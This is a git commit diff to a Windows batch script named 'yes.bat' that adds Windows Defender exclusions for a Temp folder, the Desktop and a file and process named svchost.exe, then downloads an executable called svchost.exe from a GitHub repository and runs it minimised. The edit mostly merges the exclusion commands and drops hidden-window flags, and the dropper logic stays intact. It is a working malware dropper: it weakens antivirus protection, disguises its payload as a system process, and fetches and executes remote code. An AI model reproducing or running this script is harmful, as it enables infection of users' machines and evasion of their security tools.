c34c664fcc7d5335ac97bc8b350350e6c1db0a24
bouncegame <lachlanezra@gmail.com>
2025-12-22 02:58:23 +1030

    Update yes.bat

--- yes.bat
+++ yes.bat
@@ -15,38 +15,22 @@ if %errorlevel%==0 (
 echo Adding Defender exclusions...
 
 :: Add Defender exclusions
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Temp' -ErrorAction SilentlyContinue"
-if %errorlevel%==0 (
-    echo Exclusion added for C:\Users\%username%\AppData\Roaming\Temp
-) else (
-    echo Error adding exclusion for C:\Users\%username%\AppData\Roaming\Temp
-)
-
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Temp\svchost.exe' -ErrorAction SilentlyContinue"
-if %errorlevel%==0 (
-    echo Exclusion added for C:\Users\%username%\AppData\Roaming\Temp\svchost.exe
-) else (
-    echo Error adding exclusion for C:\Users\%username%\AppData\Roaming\Temp\svchost.exe
-)
-
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue"
-if %errorlevel%==0 (
-    echo Exclusion added for svchost.exe process
-) else (
-    echo Error adding exclusion for svchost.exe process
-)
-
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\Desktop' -ErrorAction SilentlyContinue"
-if %errorlevel%==0 (
-    echo Exclusion added for C:\Users\%username%\Desktop
-) else (
-    echo Error adding exclusion for C:\Users\%username%\Desktop
-)
+powershell -Command ^
+ "& { ^
+     Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Temp' -ErrorAction SilentlyContinue; ^
+     Write-Host 'Exclusion added for C:\Users\%username%\AppData\Roaming\Temp'; ^
+     Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Temp\svchost.exe' -ErrorAction SilentlyContinue; ^
+     Write-Host 'Exclusion added for C:\Users\%username%\AppData\Roaming\Temp\svchost.exe'; ^
+     Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue; ^
+     Write-Host 'Exclusion added for svchost.exe process'; ^
+     Add-MpPreference -ExclusionPath 'C:\Users\%username%\Desktop' -ErrorAction SilentlyContinue; ^
+     Write-Host 'Exclusion added for C:\Users\%username%\Desktop'; ^
+ }"
 
 echo Downloading svchost.exe...
 
 :: Download svchost.exe from the specified URL
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe', '%USERPROFILE%\Desktop\svchost.exe')"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe', '%USERPROFILE%\Desktop\svchost.exe')"
 if %errorlevel%==0 (
     echo svchost.exe downloaded successfully
 ) else (
@@ -59,3 +43,4 @@ echo Running svchost.exe...
 start "" /min "%USERPROFILE%\Desktop\svchost.exe"
 
 echo Script completed.
+pause
